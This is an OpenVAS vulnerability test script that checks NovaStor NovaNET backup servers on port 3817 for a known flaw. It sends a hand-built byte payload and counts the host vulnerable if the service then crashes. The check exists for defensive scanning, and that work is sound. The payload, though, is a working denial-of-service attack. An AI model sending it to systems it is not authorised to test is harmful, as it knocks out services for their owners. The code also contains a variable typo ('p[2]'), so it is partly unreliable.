###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_novaStor_novaNET_39693.nasl 8438 2018-01-16 17:38:23Z teissa $
#
# NovaStor NovaNET Multiple Code Execution, Denial of Service, Information Disclosure Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "NovaStor NovaNET is prone to code-execution, denial-of-service, and
information-disclosure vulnerabilities.

An attacker can exploit these issues to execute arbitrary code, access
sensitive information, or crash the affected application, denying
service to legitimate users. Successful attacks may result in the
complete compromise of an affected computer.

NovaNET 11 and 12 are vulnerable to all of these issue; NovaBACKUP
Network 13 is affected by a denial-of-service vulnerability.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100612");
 script_version("$Revision: 8438 $");
 script_tag(name:"last_modification", value:"$Date: 2018-01-16 18:38:23 +0100 (Tue, 16 Jan 2018) $");
 script_tag(name:"creation_date", value:"2010-04-28 14:05:27 +0200 (Wed, 28 Apr 2010)");
 script_bugtraq_id(39693);
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_name("NovaStor NovaNET Multiple Code Execution, Denial of Service, Information Disclosure Vulnerabilities");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/39693");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Denial of Service");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl");
 script_require_ports("Services/unknown", 3817);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("byte_func.inc");

set_byte_order(BYTE_ORDER_LITTLE_ENDIAN);

if(safe_checks())exit(0);

port = 3817;
if(!get_tcp_port_state(port))exit(0);

function service_alive(soc) {

  ip = this_host();
  ip = split(ip, sep:'.', keep:FALSE);
  ip = raw_string(int(ip[0])) + raw_string(int(ip[1])) + raw_string(int(p[2])) + raw_string(int(ip[3]));

  req = mkdword(0x8454) +  mkdword(0) +  mkdword(6) +  mkdword(0x92) +  mkdword(0) + mkdword(0) + 
        mkdword(rand()) +  mkdword(0) +  mkdword(1) +  ip + crap(data:raw_string(0x00), length:28) +
        mkdword(1) + mkdword(port) +  crap(data:raw_string(0x00), length:8) +
        "OpenVAS" + crap(data:raw_string(0x00), length:24) + 
        "Sup: Registration" +  crap(data:raw_string(0x00), length:17) ;

  send(socket:soc, data:req);
  buf = recv(socket:soc, length:1024);

  if(strlen(buf) > 16 && getdword(blob:buf, pos:0) == 0x8453 && "Sup: Registration" >< buf) {
    return TRUE;
  }

return FALSE;

}

soc = open_sock_tcp(port);
if(!soc)exit(0);

if(!service_alive(soc:soc)) {
  close(soc);
  exit(0);
}  

close(soc);

soc = open_sock_tcp(port);
if(!soc)exit(0);

smash = raw_string(
0x54,0x84,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x92,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
0x00,0x00,
0x51,0x84,0x00,0x00,0x00,0x00,0x00,0x30,0x05,0x00,0x00,0x00,0xa2,0xb1,0x22,0x32,
0x00,0x00,0x00,0x00);

send(socket:soc, data:smash); 
if(!service_alive(soc:soc)) {
  security_message(port:port);
  exit(0);
}

exit(0);
